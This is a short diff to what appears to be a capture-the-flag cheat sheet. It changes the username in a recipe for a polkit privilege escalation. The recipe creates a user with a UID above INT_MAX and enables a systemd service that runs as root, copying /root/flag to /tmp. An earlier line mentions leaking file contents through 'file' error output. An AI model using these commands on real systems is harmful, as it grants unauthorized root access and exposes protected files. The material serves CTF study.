@@ -276,12 +276,12 @@ Chain with `file -m /path/to/file -i -r.` to read file contents into the error c
 **Pattern:** polkit treated UIDs greater than `INT_MAX` (`2147483647`) as "unknown user" and *skipped* authentication. Create a user with `UID = 4020181224`, then run `systemctl enable -now /path/to/pwn.service` — polkit lets the call through without prompting, and systemd runs the service as root.
 
 ```bash
-useradd -u 4020181224 -m loluser
-su loluser
+useradd -u 4020181224 -m ctf
+su ctf
 # ~/pwn.service:
 # [Service]
 # ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
-systemctl enable -now /home/loluser/pwn.service
+systemctl enable -now /home/ctf/pwn.service
 cat /tmp/out
 ```
 
